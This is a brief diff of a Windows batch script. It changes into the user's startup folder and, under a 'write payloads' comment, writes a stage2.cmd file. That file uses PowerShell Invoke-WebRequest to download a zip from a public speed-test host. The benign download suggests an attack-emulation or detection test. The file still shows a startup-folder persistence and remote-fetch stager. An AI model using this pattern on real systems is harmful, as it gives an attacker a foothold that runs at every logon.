@@ -11,6 +11,7 @@ cd "%STARTUP%"
 
 @REM write payloads
 ( 
+    @echo off
     echo powershell -c "Invoke-WebRequest -Uri 'http://ipv4.download.thinkbroadband.com/10MB.zip' -OutFile 'test.zip'"
 ) > stage2.cmd
 
